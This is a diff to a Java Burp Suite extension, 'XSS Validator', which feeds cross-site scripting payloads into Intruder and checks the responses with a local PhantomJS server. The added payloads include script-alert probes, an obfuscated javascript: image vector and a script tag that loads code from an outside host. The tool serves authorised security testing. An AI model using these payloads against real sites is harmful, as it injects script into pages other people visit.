@@ -30,8 +30,11 @@ public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayl
     private static String phantomServer = "http://127.0.0.1:8093";
 	
 	public static final byte[][] PAYLOADS = {
-		"|".getBytes(),
-		"<script>alert(1)</script>".getBytes()
+		"<script>alert(1)</script>".getBytes(),
+		"'';!--\"<XSS>=&{()}".getBytes(),
+		"<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>".getBytes(),
+		"<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">".getBytes(),
+		"\"><script>alert(1)</script>".getBytes()
 	};
 	
 	public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
@@ -64,8 +67,7 @@ public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayl
     //
     
     @Override
-    public String getProcessorName()
-    {
+    public String getProcessorName() {
         return "XSS Validator";
     }
     
@@ -90,12 +92,21 @@ public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayl
         		
 	        	List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(1);
 	        	nameValuePairs.add(new BasicNameValuePair("http-response", encodedResponse));
-	        	//PhantomJs.setEntity(nameValuePairs);
+	        	
 	        	PhantomJs.setEntity(new UrlEncodedFormEntity(nameValuePairs));
 
 	        	HttpResponse response = client.execute(PhantomJs);
 	        	String responseAsString = EntityUtils.toString(response.getEntity());
-	            stdout.println(responseAsString);
+	            
+            	stdout.println("Response" + responseAsString);
+            	
+	            // parse response for XSS
+	            if(responseAsString.contains("message")) {
+	            	// Append weird string to identify XSS
+		            String newResponse = helpers.bytesToString(messageInfo.getResponse()) + "fy7sdufsuidfhuisdf";
+	            	messageInfo.setResponse(helpers.stringToBytes(newResponse));
+	            }
+	            
         	} catch (Exception e) {
         		stderr.println(e.getMessage());
         	}
@@ -108,14 +119,11 @@ public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayl
 		
 		@Override
 		public boolean hasMorePayloads() {
-			System.out.println("Checking for more payloadz");
 			return payloadIndex < PAYLOADS.length;
 		}
 		
 		@Override
-		public byte[] getNextPayload(byte[] baseValue) {
-			System.out.println("Getting next payload");
-			
+		public byte[] getNextPayload(byte[] baseValue) {			
 			byte[] payload = PAYLOADS[payloadIndex];
 			payloadIndex++;
 			return payload;
